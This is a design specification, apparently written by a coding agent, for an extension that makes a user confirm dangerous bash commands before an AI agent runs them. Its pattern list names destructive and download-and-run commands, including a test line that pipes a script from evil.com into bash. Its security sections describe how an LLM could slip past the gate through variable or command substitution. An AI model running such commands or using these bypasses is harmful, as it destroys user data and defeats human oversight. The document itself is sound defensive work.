---
name: dangergate-popup
status: hardened         # draft | review | approved | hardened
author: pi-coding-agent
created: 2026-05-16
version: 1.1.0
hardened_date: 2026-05-16
hardened_findings_addressed: 3 CRITICAL resolved, 7 WARNING (5 resolved, 2 deferred), 5 INFO acknowledged
---

# Dangergate Popup — Specification

> **Status:** 🟢 HARDENED · **Version:** 1.1.0 · **Author:** pi-coding-agent · **Created:** 2026-05-16 · **Hardened:** 2026-05-16

---

## Problem Statement

Pi's coding agent executes bash commands on behalf of the LLM. Without user confirmation, a model hallucination or adversarial prompt could trigger genuinely destructive operations — disk formatting, force pushes, unconditional database deletes, recursive file removal, and more. Currently, there is **no built-in safety mechanism** in the tool execution pipeline to intercept and confirm such commands before they run.

The dangergate-popup extension solves this by:
- Intercepting `tool_call` events for the `bash` tool
- Pattern-matching command strings against a curated list of dangerous operations
- Presenting an overlay dialog that blocks execution until the user explicitly confirms (Y) or denies (N)
- Allowing long commands to be scrolled and fully inspected before decision

**Key metrics / evidence:**
- No existing built-in confirmation gate in Pi's tool execution pipeline
- LLM-generated shell commands are a known failure surface for destructive ops
- The `confirm-destructive.ts` example exists but only handles session-level events (clear/switch/fork), not bash commands
- Manual `tool_call` interception requires custom extension code per user — this productizes it

---

## Environment Constraints

### Filesystem

| Path | Constraint | Impact |
|------|-----------|--------|
| `~/.pi/agent/extensions/` | Auto-discovery location for global extensions; writable by default | Extension entrypoint (`extensions/danger-gate/index.ts`, symlinked as `danger-gate.ts`) loads automatically |
| `.pi/extensions/` | Auto-discovery location for project-local extensions; writable by default | Alternative placement for per-project gating rules |

### Hardware & Runtime

| Resource | Available | Notes |
|----------|-----------|-------|
| GPU / CUDA | N/A | Extension runs in Node.js process — no GPU dependency |
| Terminal | Required (interactive) | `ctx.ui.custom()` overlay requires an interactive TUI. No-op in `-p` (print) or JSON mode. Check `ctx.hasUI`. |
| jiti | Required | Extensions loaded via jiti (TypeScript at runtime); available by default in Pi |

### Network Restrictions

| Constraint | Impact |
|------------|--------|
| Offline operation | Extension is fully offline — no network calls, no telemetry |

> 🟡 **Impact on Implementation:** The extension must gracefully handle non-interactive contexts. When `ctx.hasUI` is `false` (print mode, JSON mode), the gate should either allow-through with a log or deny-by-default — this trade-off is covered in Proposed Solution below.

---
## User Stories

| # | Story | Priority | Acceptance Criteria |
|---|-------|----------|---------------------|
| 1 | As a Pi user, I want destructive bash commands to require my confirmation before execution, so that I prevent accidental data loss. | 🔴 High | A scrollable overlay dialog appears; command is blocked until Y/N response; `rm -rf /` style commands trigger the gate |
| 2 | As a Pi power user, I want to customize which patterns are gated, so that I can add project-specific dangerous operations (e.g., `DROP DATABASE`). | 🟡 Medium | Extension supports adding/removing regex patterns in `DANGEROUS_PATTERNS` array; no rebuild needed on `/reload` |
| 3 | As a Pi user running headless (print mode), I want the gate to have a safe default behavior, so that non-interactive sessions don't hang indefinitely. | 🔴 High | In non-interactive mode (`ctx.hasUI === false`), handler checks guard BEFORE pattern matching; emits `console.warn()` with command + matched pattern; allows-through without hanging. This check is mandatory (CRITICAL fix from red team audit). |
| 4 | As a Pi user executing long multi-line commands, I want to scroll the full command before confirming, so that I can inspect piped/chained operations fully. | 🟡 Medium | Dialog supports ↑/↓ and PgUp/PgDown scrolling; scroll position indicator shown when content exceeds viewport |
| 5 | As a Pi user, I want false-positive-free gating, so that benign commands like `rm -h` or `man rm` don't trigger unnecessary confirmations. | 🟡 Medium | Patterns exclude help flags (`-h`, `--help`); regex uses word boundaries where appropriate |

---

## Proposed Solution

### Overview

The dangergate-popup extension subscribes to the `tool_call` event for the `bash` tool. On each bash command, it checks the command string against a set of curated dangerous-operation regex patterns. If any pattern matches, an overlay dialog is presented via `ctx.ui.custom()` with:
- A red-titled "⚠ DANGEROUS COMMAND" header
- A scrollable preview pane showing the full command text (up to 16 lines)
- Scroll position indicator when content exceeds viewport
- Y/N confirmation prompt with keyboard navigation hints

**Mandatory non-interactive guard (CRITICAL fix):** Before any pattern matching or UI rendering, the handler MUST check `ctx.hasUI`. If `false` (print mode, JSON mode), skip all gating logic, emit `console.warn()` with command + matched pattern, and allow-through. This prevents deadlock in headless sessions.

If the user confirms (Y/Enter), the command proceeds normally. If denied (N/Esc), the handler returns `{ block: true, reason: "..." }` which prevents execution and records the denial in the tool result.

**Mandatory exception handling (CRITICAL fix):** The `ctx.ui.custom()` call MUST be wrapped in try/catch. On any exception from the UI layer (TUI not initialized, theme error, rendering crash), log a warning with `console.warn("Dangergate: UI error, allowing through:", err.message)` and allow-through per configured non-interactive policy. This prevents gate bypass when UI fails.

### Architecture Diagram

````mermaid
graph TD
    subgraph LLM_Turn["LLM Agent Turn"]
        A[LLM generates bash tool call] --> B[tool_execution_start event]
        B --> C[tool_call event fires]
    end

    subgraph DangerGate["Dangergate Extension Handler"]
        C --> D{Is bash tool?}
        D -- No --> E[(pass through)]
        D -- Yes --> E1{ctx.hasUI?}
        E1 -- No --> E2[console.warn() + pass through]
        E1 -- Yes --> F{Pattern matches dangerous list?}
        F -- No --> E
        F -- Yes --> G[Show overlay dialog via ctx.ui.custom (wrapped in try/catch)]
        G --> H{User response}
        H -- Confirm Y/Enter --> I[break loop, allow execution]
        H -- Deny N/Esc --> J[return block:true + reason]
        G -- UI throws --> E2
    end

    subgraph Pi_Core["Pi Core"]
        I --> K[bash executes command]
        J --> L[tool blocked, result recorded]
        K --> M[tool_result event]
        L --> M
    end

    style DangerGate fill:#fff3f3
    style G fill:#ffcccc
    style J fill:#ff6666,color:#ffffff
````

*Caption: Event flow through the dangergate extension during a bash tool call.*

### Dialog Component Lifecycle

````mermaid
stateDiagram-v2
    [*] --> Idle
    Idle --> DialogOpened: Dangerous command detected
    DialogOpened --> Scrolling: User presses ↑/↓/PgUp/PgDown/Home/End
    Scrolling --> DialogOpened: Scroll position updated
    DialogOpened --> CommandAllowed: User presses Y or Enter
    DialogOpened --> CommandBlocked: User presses N or Esc
    CommandAllowed --> [*]: Command executes normally
    CommandBlocked --> [*]: Tool call blocked, reason recorded
````

*Caption: State machine for the DangerDialog overlay component.*

### Trade-off Analysis

| Aspect | Approach A — Deny-by-default (non-UI) | Approach B — Allow-with-log (non-UI) (Selected) |
|--------|----------------------------------------|--------------------------------------------------|
| **Safety** | ✅ No command runs without explicit confirmation | Command runs in headless mode — risk of silent execution |
| **UX** | 🔴 Headless sessions deadlock indefinitely | 🟡 Log warning allows operator to review output post-factum |
| **Complexity** | Low — same logic path | Medium — needs branching on `ctx.hasUI` |
| **Real-world use** | Blocks all CI/CD, scripting, `-p` mode usage | Allows automation; safety relies on operator reviewing logs |

> 🟢 **Decision:** Approach B (Allow-with-log) for non-interactive modes — the extension should not break headless workflows. A `console.warn()` is emitted with the matched command and pattern. Future enhancement: configurable default policy per environment.
>
> ⚠️ **Red team hardening note:** The `ctx.hasUI` guard check (see Proposed Solution) MUST be placed before any pattern matching or UI calls. Without it, non-interactive modes will deadlock. Additionally, Pi's fail-safe behavior for `tool_call` errors ("errors block the tool") provides a safety net — unhandled exceptions in the handler result in tool blocking rather than pass-through. However, explicit try/catch around `ctx.ui.custom()` is still required for graceful degradation and user visibility into failures.

| Aspect | Hardcoded patterns | Configurable via settings.json (Selected) |
|--------|-------------------|-------------------------------------------|
| **Flexibility** | 🔴 Users must edit source to add/remove patterns | ✅ Patterns editable without touching code |
| **Safety** | ✅ Fixed set reviewed and tested | 🟡 User misconfiguration could widen or narrow scope |
| **Complexity** | Low | Medium — needs settings loading, validation, merge with defaults |
| **Maintainability** | Medium — requires extension update for pattern changes | ✅ Operators control their own risk profile |

> 🟢 **Decision:** Configurable patterns via a dedicated config mechanism. The `DANGEROUS_PATTERNS` array in the source serves as default; a user-level config (e.g., `~/.pi/agent/dangergate.json`) or `settings.json` override can add/remove patterns. This is implemented in Phase 2.

---
## Pattern Reference (Data Model)

### Dangerous Patterns Registry

Each entry is a JavaScript `RegExp` instance. The command string is tested against each pattern; the **first match** triggers the dialog (no need to check remaining patterns).

| # | Category | Pattern | Matches | Excludes |
|---|----------|---------|---------|----------|
| P1 | File deletion | `\brm\s+(?!(-h\|--help)\b)` | `rm -rf /`, `rm file.txt` | `rm -h`, `rm --help` |
| P2 | File deletion | `\bunlink\b` | `unlink file.txt` | — |
| P3 | Secure deletion | `/\bshred\b/` | `shred -u secret.dat` | `unshred`, `myshredder` (**HARDENED: leading \b added**) |
| P4 | Disk formatting | `\bmkfs\b` | `mkfs.ext4 /dev/sda1` | — |
| P5 | Raw disk writes | `/\bdd\s+if=/` | `dd if=/dev/sda of=backup.img` | `badd if=`, `grep -r "dd if=" src/` (**HARDENED: leading \b added**) |
| P6 | File viewing | `\bfatcat\b` | `fatcat /dev/sda1` | — |
| P7 | DB destructive | `DROP\s+(TABLE\|DATABASE\|SCHEMA\|INDEX)\b/i` | `DROP TABLE users`, `DROP DATABASE prod` | `drop` as noun |
| P8 | DB destructive | `TRUNCATE\s+TABLE\b/i` | `TRUNCATE TABLE logs` | — |
| P9 | DB destructive | `ALTER\s+TABLE.*DROP\b/i` | `ALTER TABLE users DROP COLUMN age` | — |
| P10 | DB destructive (no WHERE) | `DELETE\s+FROM\b(?!\s+\w+\s+WHERE)/i` | `DELETE FROM users` (no WHERE) | `DELETE FROM users WHERE id=1` |
| P11 | System-level | `\bsudo\s+/m` | `sudo apt purge nginx` | — |
| ~~P12~~ | ~~Editor force-quit~~ | **REMOVED** | vim `:wq!` is non-destructive in bash context; adds noise without safety value (**HARDENED**) | — |
| P13 | FS repair | `/\bfsck\b/` | `fsck /dev/sda1` | — |
| P14 | Disk partitioning | `\bfdisk\b` | `fdisk /dev/sda` | — |
| P15 | Partition editor | `\bparted\b` | `parted /dev/sda` | — |
| P16 | Git force push | `git\s+push\s+--force\b/i` | `git push --force`, `git push --force-with-lease` | `git push origin main` |
| P17 | Git force clean | `git\s+clean\s+-fd\b/i` | `git clean -fd` | `git clean -n` (dry run) |
| P18 | Git hard reset | `git\s+reset\s+--hard\b` | `git reset --hard HEAD~1` | `git reset HEAD~1` (soft) |
| P19 | NPM global remove | `\bnpm\s+(uninstall\|remove)\s+(-g\|--global)/` | `npm uninstall -g package` | `npm uninstall package` |
| P20 | Pip force uninstall | `/\bpip\s+uninstall\s+-y\b/` | `pip uninstall -y package` | `pip uninstall package` (interactive) |
| P21 | Pipe to shell (**HARDENED**) | `/\|\s*bash\b/i` | `echo script \| bash`, `curl ... \| bash` | — |
| P22 | Pipe to sh (**HARDENED**) | `/\|\s*sh\b/i` | `cat file \| sh`, `wget ... \| sh` | — |
| P23 | Eval (**HARDENED**) | `/\beval\b/` | `eval "rm -rf /"`, `eval $CMD` | — |
| P24 | Python inline exec (**HARDENED**) | `/\bpython\d*\s+-c\b/` | `python3 -c "import os; os.system(...)"` | `python3 script.py` (no -c) |

### Dialog Dimensions

| Parameter | Value | Notes |
|-----------|-------|-------|
| `MAX_PREVIEW_HEIGHT` | 16 lines | Hard cap on scrollable area |
| `reserved` (UI chrome) | 7 lines | border(1) + spacer(1) + title(1) + scroll-indicator(1) + spacer(1) + hint(1) + border(1) |
| Min dialog width | Auto-calculated | At least enough for title text + borders |
| `MAX_PREVIEW_CHARS` | 4096 (4KB) | **HARDENED:** Hard cap on total preview characters. Prevents unbounded memory allocation during render on adversarial multi-MB commands. Truncated lines show `[... command truncated]` indicator. |
| Line truncation order | `slice()` BEFORE `padEnd()` | **HARDENED:** Always truncate input before padding to avoid intermediate string allocation spike. |

---

## Extension API Interface

### Events Consumed

| Event | Purpose | Return Type |
|-------|---------|-------------|
| 🔵 `tool_call` | Intercept bash commands before execution | `{ block: true, reason?: string }` or `undefined` (pass-through) — **Verified against Pi Extension API docs** (extensions.md §Tool Events, line 688: "Return values from `tool_call` only control blocking via `{ block: true, reason?: string }`"). Session events use `{ cancel: true }`; tool_call uses `{ block: true }`. |

### UI Methods Used

| Method | Purpose |
|--------|---------|
| `ctx.ui.custom<boolean>(componentFn, { overlay: true })` | Render scrollable confirmation dialog as overlay |
| `ctx.hasUI` | Guard: skip gate in non-interactive modes (print/JSON) |

### Types Imported

| Import | From | Purpose |
|--------|------|---------|
| `ExtensionAPI` | `@earendil-works/pi-coding-agent` | Extension factory parameter |
| `isToolCallEventType` | `@earendil-works/pi-coding-agent` | Type-narrow for bash tool events |
| `matchesKey`, `Key` | `@earendil-works/pi-tui` | Keyboard input matching in dialog |

### Configuration Interface (Phase 2)

```typescript
interface DangergateConfig {
  /** Additional patterns beyond defaults (max 50 entries; each validated as compilable RegExp) */
  additionalPatterns?: string[];
  /** Patterns to exclude from defaults (max 50% of total allowed); indices are 1-based matching Pattern Reference # */
  excludedPatternIndices?: number[];
  /** Default behavior when ctx.hasUI is false: "allow-log" | "deny" | "allow-silent" */
  nonInteractivePolicy?: NonInteractivePolicy;
  /** Max lines for command preview (default: 16) */
  maxPreviewHeight?: number;
  /** Dialog timeout in ms before auto-deny (default: 60000) */
  timeoutMs?: number;
}

type NonInteractivePolicy = "allow-log" | "deny" | "allow-silent";
```

**Config validation rules (HARDENED — red team finding #9):**
| Rule | Enforcement | Rationale |
|------|-------------|----------|
| `additionalPatterns` length ≤ 50 | Reject with error on load | Prevents regex-complexity DoS; every bash call tests all patterns |
| Each pattern must compile as valid RegExp | Reject with specific error message | Invalid regex crashes handler silently |
| `excludedPatternIndices` count < 50% of total active patterns | Warn (not reject) when ≥50%; log to console | Prevents complete gate neutralization via config tampering |
| At least 3 default patterns must remain active after exclusion | Enforced; reject config if fewer than 3 remain | Guarantees minimum protection against file deletion + disk ops |
| Log `console.info("Dangergate: loaded config, N patterns active (M defaults, K additional)")` | Always on load | Audit trail for config state visibility |
| Invalid/missing config file | Fall back to defaults silently with `console.warn` | Graceful degradation; never crash on bad config |

---

## Implementation Plan

| Phase | Milestone | Complexity | Dependencies | Timeline |
|-------|-----------|------------|--------------|----------|
| **Phase 1 — Core Gate** | `extensions/danger-gate/index.ts` with hardcoded patterns (P1-P24 including pipe/eval/python), scrollable dialog, `ctx.hasUI` guard, try/catch around `ctx.ui.custom()`, **configurable timeout** (default 60s auto-deny with countdown display) | 🟢 Low→🟡 Medium (hardened) | Pi extension API, pi-tui | Baseline |
| **Phase 2 — Configuration** | User-configurable patterns via `~/.pi/agent/dangergate.json` or `settings.json`; non-interactive policy selection; config validation: reject invalid regexes, cap additionalPatterns at 50, warn if >50% excluded, log pattern count on load | 🟡 Medium (hardened) | Phase 1, `node:fs` for config read | Iteration 1 |
| **Phase 3 — Pattern Enhancements** | Severity levels per pattern (warning vs critical); matched-pattern display in dialog; exclude-list from settings | 🟡 Medium | Phase 2 | Iteration 2 |
| **Phase 4 — Logging & Audit** | Append blocked/allowed decisions to session via `pi.appendEntry()`; command history viewer | 🟢 Low | Phase 1-3 | Iteration 3 |

---
## Risk Assessment

| # | Risk | Likelihood | Impact | Severity | Mitigation |
|---|------|------------|--------|----------|------------|
| R1 | Dialog hangs indefinitely if user doesn't respond — blocks entire agent turn | Medium | High | 🟡 Medium (mitigated) | **HARDENED:** Phase 1 MUST implement configurable timeout (default: 60s) with auto-deny on expiry. Dialog hint line shows countdown when time < 15s remaining. Timeout is configurable via `DangergateConfig.timeoutMs`. After timeout: auto-deny, log reason "Auto-denied after timeout", record decision in Phase 4 audit log. |
| R2 | Regex false negatives miss genuinely dangerous commands (e.g., `curl -X DELETE`, remote script execution, piped shell code) | Medium | High | 🟡 Medium (mitigated) | **HARDENED:** Phase 1 adds pipe-to-shell patterns (`\|\s*bash\b`, `\|\s*sh\b`), `eval\b`, and `python\d*\s+-c\b` to pattern registry. Phase 2 config lets users add custom patterns. Known bypass vectors (variable substitution, heredoc embedding) documented in Security Considerations with explicit user-facing disclaimer that this is NOT comprehensive protection. |
| R3 | Regex false positives block benign commands (e.g., `man rm`, reading `rm` source) | Low | Medium | 🟡 Medium | Patterns use word boundaries (`\b`) and negative lookaheads; tested against common safe commands before each release |
| R4 | Non-interactive mode allows destructive commands silently (Approach B trade-off) | Medium | High | 🔴 High | `console.warn()` emitted with command + pattern; configurable policy in Phase 2 lets users switch to deny-by-default for CI/CD |
| R5 | Long scrollable dialogs obscure context on small terminals (< 80 cols) | Low | Low | 🟢 Low | Dialog clamps preview height based on available width; minimal chrome (7 lines reserved). Users can resize terminal for complex commands |

### Error Scenarios

<details>
<summary>Expand error scenarios</summary>

- **`ctx.ui.custom()` throws (any mode):** MANDATORY: The `ctx.ui.custom()` call MUST be wrapped in try/catch (CRITICAL fix from red team audit). On exception: log warning with `err.message` and allow-through per configured non-interactive policy. This prevents gate bypass on UI crash — an unhandled rejection could cause Pi's event system to treat the handler result as pass-through, silently allowing destructive commands.
- **`ctx.ui.custom()` throws in print mode:** Guarded by `ctx.hasUI` check as first line of defense.
- **Command exceeds terminal width (single-line command > 200 chars):** Dialog truncates each line to fit width minus indent. **HARDENED:** Truncation happens BEFORE `padEnd()` — use `line.slice(0, width - indent.length - 2).padEnd(...)` instead of `line.padEnd(...).slice(...)` to avoid unbounded intermediate allocation. Hard cap on total preview characters: 4096 (4KB). Beyond this, remaining lines show `[... command truncated, N chars total]` indicator.
- **Command exceeds terminal width (single-line command > 200 chars) — rendering:** User sees line-clamped text with truncation indicator. Future enhancement: horizontal scroll.
- **Extension reload during active dialog:** The dialog component instance is tied to the `ctx.ui.custom()` handle. On `/reload`, pi emits `session_shutdown`; any pending custom UI should be torn down by the TUI framework. Document that reloading with an open gate is unsupported.
- **Multiple dangerous commands in parallel tool mode:** Each bash call is preflighted sequentially through `tool_call`. Dialogs show one-at-a-time. If user denies one, remaining calls still proceed to their own checks independently.

</details>

---

## Security & Privacy

### Risks

🔴 **Regex injection via LLM-generated commands:** The patterns are fixed regexes tested *against* the command string — not constructed *from* it. No injection risk in pattern matching itself.
🔴 **False sense of security:** Users may assume the gate catches *all* dangerous operations. It does not — only curated patterns. A sophisticated attack could chain benign commands (`python -c "import os; os.system('rm -rf /')"`) that don't match any pattern.
🔴 **Command obfuscation bypass:** An LLM could split a dangerous command across multiple lines or use variable substitution: `CMD="rm -rf"; $CMD /`. The current single-string regex won't catch this.

### Safeguards

🟢 **Pattern review discipline:** All patterns are reviewed before merge; each has documented match/exclude behavior in the Pattern Reference table.
🟢 **Open source auditability:** Extension code is in plain TypeScript — fully auditable by users. No obfuscated or minified logic.
🟢 **User-in-the-loop:** Every matched command requires explicit human confirmation. No auto-approve path exists in interactive mode.
🟢 **Non-interactive warn-by-default:** Headless sessions log warnings, giving operators visibility into attempted dangerous operations without breaking automation.

---

## Testing Strategy

> 🔴 **Mandatory: E2E Validation Against Real Environments** — Testing strategy MUST include E2E validation against real environments, NOT mocks. Mocks hide the bugs that Ralph review is supposed to find. For each critical path, specify the real environment target and what observable behavior change confirms success.

| Layer | Scope | Key Scenarios | Environment |
|-------|-------|---------------|-------------|
| Unit | Regex pattern matching | Each of 20 patterns tested against known-match and known-safe commands; verify no false positives on safe set (50+ benign commands) | Node.js sandbox OK |
| Unit | DangerDialog rendering | Dialog renders correctly at widths: 40, 60, 80, 120 cols; scroll offset clamps correctly; visibleHeight adapts to width | Node.js sandbox OK |
| Integration | `tool_call` event flow | Dangerous command triggers dialog return `true` → command executes; return `false` → `{ block: true }` returned | Pi interactive mode (real extension runtime) |
| Integration | Non-interactive guard | Extension in `-p` mode does not hang; warning logged to stderr; command allowed through | Pi print mode (`pi -p`) |
| E2E | Full gate cycle | Load extension, trigger `rm testfile.txt` via agent, observe overlay dialog in terminal, press Y → file deleted; repeat with N → file intact, tool result shows block reason | **Pi interactive terminal with real `extensions/danger-gate/index.ts` loaded via `-e` flag** — verify visible overlay and actual command execution/blocking |
| E2E | Pattern false-positive sweep | Run 50+ known-safe commands (`ls`, `cat`, `git status`, `rm -h`, `man rm`) through extension — confirm zero dialogs triggered | **Pi interactive terminal with real extension** — no overlays should appear for safe commands |
| Regression | Long command scrolling | Command > 16 lines: scroll to bottom, verify last line visible; PgUp/PgDown work; Home/End jump correctly | **Pi interactive terminal** — verify scroll state via render output inspection |

---

## Security Considerations

> This section documents findings from the red team audit (`docs/security/redteam-findings-dangergate-popup.md`). Every finding has a disposition: RESOLVED, DEFERRED, or ACKNOWLEDGED.

### Missing `ctx.hasUI` guard — **RESOLVED**

- **Risk**: Extension calls `ctx.ui.custom()` in non-interactive mode → deadlock or bypass
- **Mitigation**: Mandatory `ctx.hasUI` check before any pattern matching or UI rendering. When false: emit `console.warn()`, allow-through. Documented as CRITICAL fix in Proposed Solution and Architecture Diagram.
- **Verification**: Integration test against `pi -p` (print mode) with dangerous command → no hang, warning logged

### `ctx.ui.custom()` exception handling — **RESOLVED**

- **Risk**: UI crash propagates unhandled rejection → potential gate bypass or agent disruption
- **Mitigation**: `ctx.ui.custom()` MUST be wrapped in try/catch. On exception: log warning, allow-through per non-interactive policy. Pi's fail-safe for `tool_call` errors blocks the tool on unhandled exceptions (extensions.md §2503), providing a secondary safety net.
- **Verification**: Integration test with simulated TUI error → command blocked (fail-safe) or allowed with logged warning (explicit try/catch)

### Return shape `{ block: true }` — **RESOLVED**

- **Risk**: Wrong return key could cause denials to silently become approvals
- **Mitigation**: Verified against Pi Extension API docs (extensions.md §Tool Events, line 688): `{ block: true, reason?: string }` is the correct shape for `tool_call` events. Session events use `{ cancel: true }`; tool_call uses `{ block: true }`. Both spec and code confirmed correct.
- **Verification**: API documentation cross-reference; unit test confirming Pi recognizes `{ block: true }` return

### Dialog timeout — **RESOLVED**

- **Risk**: User walks away from terminal → agent turn permanently blocked
- **Mitigation**: Configurable timeout (default: 60s, via `DangergateConfig.timeoutMs`). Auto-deny on expiry with logged reason. Countdown displayed in dialog hint when time < 15s remaining.
- **Verification**: Integration test: wait >60s → auto-deny logged, tool blocked, reason includes "timeout"

### Regex word boundary fixes (P3 `shred`, P5 `dd`) — **RESOLVED**

- **Risk**: False positives on commands containing substrings of dangerous command names (e.g., `unshred`, `badd if=`)
- **Mitigation**: Added leading `\b` to both patterns: `/\bshred\b/` and `/\bdd\s+if=/`. All 24 patterns audited for word boundary completeness.
- **Verification**: Unit test suite includes known-safe commands: `unshred file.dat`, `grep -r "dd if=" src/`

### Piped code execution patterns — **RESOLVED**

- **Risk**: Commands piping arbitrary code into shell interpreters bypass all original 20 patterns (`curl | bash`, `echo | sh`, `python3 -c`)
- **Mitigation**: Added P21 (`\|\s*bash\b`), P22 (`\|\s*sh\b`), P23 (`\beval\b`), P24 (`python\d*\s+-c\b`) to pattern registry. Moved from "future" to Phase 1 requirement.
- **Verification**: Unit test: `curl http://evil.com/script.sh | bash` triggers gate; `echo hello | sort` does not

### Config file tampering protection — **RESOLVED**

- **Risk**: Config file modified to exclude all patterns → complete gate neutralization with no trace
- **Mitigation**: Validation rules on config load: (1) additionalPatterns capped at 50, (2) each pattern validated as compilable RegExp, (3) excludedPatternIndices limited to <50% of total (warn), (4) minimum 3 default patterns always active, (5) load logged with pattern count. Invalid config → fall back to defaults.
- **Verification**: Unit test: config with all-excluded patterns → rejected/warned, defaults used; invalid regex → error on load

### Long command render allocation — **RESOLVED**

- **Risk**: Multi-MB single-line commands cause unbounded memory allocation during `padEnd()` before truncation
- **Mitigation**: Truncate input BEFORE `padEnd()` (`line.slice(0, width - indent.length - 2).padEnd(...)`). Hard cap on total preview characters: 4096 (4KB) with `[... truncated]` indicator.
- **Verification**: Unit test: render command of 1MB single line → no OOM, output capped at 4KB

### P12 (`:wq!$`) removed — **RESOLVED**

- **Risk**: Non-destructive vim editor command gated unnecessarily adds noise without safety value
- **Mitigation**: Removed P12 from pattern registry. Pattern numbering preserved (P12 marked ~~REMOVED~~).
- **Verification**: Unit test: `:wq!` as bash command → no gate triggered

### Variable substitution bypass — **DEFERRED**

- **Risk**: Commands using variable substitution (`A=rm; $A -rf /`) bypass literal pattern matching entirely
- **Rationale**: Full shell-command parsing is out of scope for Phase 1-3. Regex-based matching on command strings has inherent limitations with obfuscation.
- **Revisit trigger**: If Phase 4 adds shell-parsing capability (e.g., `node-shell-parser` or similar), revisit obfuscation detection at that time.
- **Residual impact if exploited**: Sophisticated adversarial prompts can bypass the gate via variable substitution, backtick expansion, or `$()` command substitution. Users must understand this is NOT comprehensive protection.

### Heredoc false positives — **DEFERRED**

- **Risk**: Heredocs containing dangerous strings as data trigger gates unnecessarily (e.g., `cat << 'EOF'\nrm -rf /tmp/old\nEOF`)
- **Rationale**: Heredoc-aware parsing requires understanding shell quoting context, which is complex and error-prone with regex.
- **Revisit trigger**: If user feedback indicates high false-positive rate from heredocs in Phase 1-2 testing, consider Phase 3 enhancement.
- **Residual impact if exploited**: User fatigue from false positives may lead to blind confirmation habit. Mitigated by showing matched pattern category in dialog (Phase 3 plan).

---

## Rollout & Rollback

### Rollout Sequence

````mermaid
sequenceDiagram
    participant D as Developer
    participant E as Extension File
    participant P as Pi Runtime
    participant U as User Terminal

    D->>E: Write/update extensions/danger-gate/index.ts
    D->>P: pi -e ./extensions/danger-gate/index.ts (test run)
    P->>U: Show overlay for test command (e.g., rm /tmp/testfile)
    U-->>P: Confirm Y → verify execution
    U-->>P: Deny N → verify block + reason logged

    Note over D,P: Iterate patterns/dialog as needed

    D->>E: Commit final extensions/danger-gate package
    D->>P: Place in ~/.pi/agent/extensions/danger-gate.ts (auto-discovery)
    P-->>U: Gate active for all subsequent sessions
````

*Caption: Rollout sequence from development through auto-discovery installation.*

### Rollback Plan

> 🟡 **Rollback is trivial:** Remove or rename the `danger-gate.ts` symlink/file from the extensions directory and run `/reload`. No state, database, or persistent config is modified. The extension is purely ephemeral — no installed dependencies, no session modifications (Phase 4 logging is additive only).

---

## Open Questions

- [ ] Should there be a per-pattern severity system (e.g., "critical" patterns auto-deny in non-interactive mode even with `allow-log` policy)?
- [ ] Horizontal scrolling for commands exceeding terminal width — or is truncation acceptable?
- [ ] ~~Should the dialog show *which pattern* matched, to help users understand why their command was flagged?~~ → **RESOLVED:** Yes, planned for Phase 3 (matched-pattern display). See Security Considerations §Variable substitution bypass.
- [ ] Config format: JSON file (`~/.pi/agent/dangergate.json`), `settings.json` key, or inline comments in extension source?
- [ ] ~~Timeout behavior: auto-deny after N seconds of inactivity? What default (30s? 60s?) and should it be configurable?~~ → **RESOLVED:** Default 60s auto-deny, configurable via `DangergateConfig.timeoutMs`. Countdown shown at <15s.
- [ ] Should the extension expose a custom tool (`dangergate_status`) for the LLM to query current gate configuration?

---

*Generated by generate-spec · 2026-05-16*
